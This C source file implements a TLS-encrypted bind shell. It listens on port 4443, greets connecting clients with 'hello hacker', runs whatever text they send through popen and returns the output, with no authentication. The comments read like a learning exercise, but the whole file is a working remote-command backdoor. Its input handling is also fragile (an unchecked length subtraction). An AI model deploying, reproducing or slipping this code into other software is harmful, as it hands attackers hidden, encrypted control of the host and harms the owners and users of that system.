#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

int create_socket(int port)
{
    int s;
    struct sockaddr_in addr;
    // the sockaddr structure
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    // socket for streaming
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
	    perror("Unable to create socket");
	    exit(EXIT_FAILURE);
    }
    // binding the socket to the address
    if (bind(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
	    perror("Unable to bind");
	    exit(EXIT_FAILURE);
    }
    // we listen and accept 1 client max
    if (listen(s, 1) < 0) {
	    perror("Unable to listen");
	    exit(EXIT_FAILURE);
    }

    return s;
}
// init the context for using SSL along with the socket
void init_openssl()
{ 
    SSL_load_error_strings();	
    OpenSSL_add_ssl_algorithms();
}
// cleanup stuff
void cleanup_openssl()
{
    EVP_cleanup();
}
// ctx will be used for secure socket interaction
// learn about everything related -> https://www.openssl.org/docs/man1.0.2/man3/SSL_use_certificate_ASN1.html
SSL_CTX *create_context()
{
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = SSLv23_server_method();
    /*creates a new SSL_CTX object as a framework to establish TLS/SSL or DTLS enabled connections using the library context libctx */
    ctx = SSL_CTX_new(method);
    if (!ctx) {
	    perror("Unable to create SSL context");
	    ERR_print_errors_fp(stderr);
	    exit(EXIT_FAILURE);
    }

    return ctx;
}

void configure_context(SSL_CTX *ctx)
{
    // set up the certificate for tls to be used in the server

    // eliptic curve crypto stuff 
    SSL_CTX_set_ecdh_auto(ctx, 1);

    /* Set the key and cert */
    if (SSL_CTX_use_certificate_file(ctx, "cert.pem", SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
	    exit(EXIT_FAILURE);
    }

    if (SSL_CTX_use_PrivateKey_file(ctx, "key.pem", SSL_FILETYPE_PEM) <= 0 ) {
        ERR_print_errors_fp(stderr);
	    exit(EXIT_FAILURE);
    }
}

int main(int argc, char **argv)
{
    int sock;
    SSL_CTX *ctx;
    char bufbuf[100];
    char cmdbuf[100];
    char command[100];
    int bytes_read;
	FILE *fp;
	
    //get the environment ready
    init_openssl();
    ctx = create_context();
    configure_context(ctx);
    // create a basic socket
    sock = create_socket(4443);

    /* Handle connections, all the time */
    while(1) {
        struct sockaddr_in addr;
        uint len = sizeof(addr);
        SSL *ssl;
        const char reply[] = "test\n";
        // acept the connection from the client, a socket for the client will be created
        int client = accept(sock, (struct sockaddr*)&addr, &len);
        if (client < 0) {
            perror("Unable to accept");
            exit(EXIT_FAILURE);
        }
        // get the SSL reference for the client socket  
        ssl = SSL_new(ctx);
		SSL_set_fd(ssl, client);

        // accept the ssl connection 
        if (SSL_accept(ssl) <= 0) {
            ERR_print_errors_fp(stderr);
        }
        else {	
            // after accepting it, we can start reading/writting
			SSL_write(ssl, "hello hacker \n", 15);
			
			do{
                // zero the buffers
				memset(bufbuf,0,100);
				memset(cmdbuf,0,100);
				memset(command,0,100);
				
				bytes_read = SSL_read(ssl, &bufbuf, 100);
                // if the client closes the socket we are not reading anything
				if(bytes_read > 0){
					//instead bufbuf[strlen(bufbuf)-2] = '\0' 
					strncpy(command,bufbuf,bytes_read-2);

					fp = popen(command, "r");
					while (fgets(cmdbuf, sizeof(cmdbuf), fp) != NULL){
						SSL_write(ssl, cmdbuf, strlen(cmdbuf));
					}

					pclose(fp);
				}

			}while(bufbuf[0] !='\0');
            //if buffer is empty (so nothing has entered from the network) we go on 
        }
        // we get rid of the (client) socket
        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(client);
    }
    //and finally get rid of the rest
    close(sock);
    SSL_CTX_free(ctx);
    cleanup_openssl();
}
